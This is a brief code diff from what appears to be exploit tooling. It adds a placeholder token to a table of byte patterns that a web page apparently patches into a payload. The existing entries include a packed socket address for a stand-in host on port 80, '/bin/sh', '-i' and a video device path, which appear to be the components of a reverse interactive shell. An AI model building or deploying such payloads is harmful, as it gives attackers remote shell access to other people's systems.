@@ -32,6 +32,8 @@ PATTERNS = {
     "sa": b"\x02\x00\x00\x50\xc0\x00\x02\x01",
     "path": b"/dev/video30\0",
     "hello": b"PGDB",
+    "tok": b"\x31\x4f\x4b\x54",   # 0x544b4f31 "TOK1" placeholder; the page
+                                  # pattern-patches it, so it must be unique
     "shpath": b"/bin/sh\0",
     "arg_i": b"-i\0",
 }
